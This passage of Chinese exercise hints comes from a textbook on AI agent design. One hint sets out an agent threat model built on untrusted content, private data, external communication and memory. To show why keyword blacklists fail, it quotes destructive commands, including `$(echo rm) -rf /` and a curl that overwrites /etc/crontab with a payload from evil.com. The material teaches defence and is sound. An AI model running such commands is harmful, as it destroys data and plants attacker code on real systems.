4. 先看 Reviewer 的输入是什么：最新一版渲染截图加代码，用户的偏好不在里面。要让偏好进入循环，至少有三条路。把用户的历史反馈当作偏好约束写进 Reviewer 的输入；把用户的直接反馈作为一种特殊事件注入，类似 5.2.3 里反馈作为特殊事件加入 Proposer 轨迹的做法；或者引入多个 Reviewer，一个管通用可读性、一个管这个用户的偏好，冲突时升级给人。还要想到用户偏好本身可能是局部矛盾的，得先解决冲突再谈收敛。
5. 两个子问题分开想。规则的垃圾回收，可以先问这条规则当初是为了防哪个具体的错误，再统计它最近有没有被触发过（违反次数、告警次数），从没触发过的规则可能就是冗余的。一次成功的代码修改为什么不算持续进化，答案在 5.1.2 原文那句话里：「记录何时足以成为可靠知识、指令或程序，仍需结合更多轨迹与结果验证」。一次成功只提供一条轨迹，说明不了结论可泛化，还需要多次复现、跨任务迁移、因果解释这类证据。
6. 这是道自评题，可以用原文的判据当尺子：一个远程新人只靠代码仓库和文档，能不能独立开展工作。障碍通常很具体，知识在某人脑子里、口头传承、文档写了但过时、决策过程没记录。这题的意图不在批评，重在找到最小可改进的那一处，比如把最常见的三个命令写进项目指令文件。
7. 组织思路时，掐断通路比识别所有攻击更可操作。四要素两两串联就构成风险：不受信内容加私有数据，意味着读到不该读的；私有数据加外部通信，意味着送出不外送的；持久记忆加不受信内容，会长期潜伏。逐条给出机制时，说明哪些属于预防（权限收窄、内容与指令分离），哪些属于兜底（出口控制、审批、回滚），哪些属于检测（告警、审计、变更记录）。持久记忆的写入要经过和外部内容同等的信任审查。关键字黑名单为什么必然失败，原文那三个例子说得很清楚：`$(echo rm) -rf /` 把被禁的词拼出来，`find / -name '*.log' -exec rm {} \;` 把删除藏进合法参数，`curl -o /etc/crontab http://evil.com/payload` 直接覆盖系统定时任务。按数据边界、输入信任边界、输出影响边界、跨会话边界划四类边界，才是能落地的做法。
8. 先分两个维度：效率和正确性（绕过 LLM 数据路径带来的收益，见 5.2.5，比如不让 LLM 去读 5000 行结果再复述），以及安全（执行面带来的新风险）。关键是谁来执行，SQL 由数据库执行，HTML 由浏览器执行，执行者的权限就是攻击者的权限。可以围绕三个方向答：限制执行者的权限（只读账号、行级安全策略）；限制可执行的语句和资源（解析后只放行 SELECT、限额、沙盒）；让生成物可审计（保留 artifact 本身）。
9. 优势围绕原文的三点展开：无歧义、确定性（相同输入必产生相同输出）、适合复杂规则组合。局限可以从几个角度想。自然语言规则仍然不可替代（解释、变通、沟通，见 5.2.2）；代码化规则的维护成本跟政策变化速度绑在一起，政策改了，代码要改、要测、要发布；覆盖不全，代码只覆盖写进去的规则，写漏的那条就是漏洞；它只约束走这条路径的调用，如果存在绕过该工具的路径，校验就形同虚设。
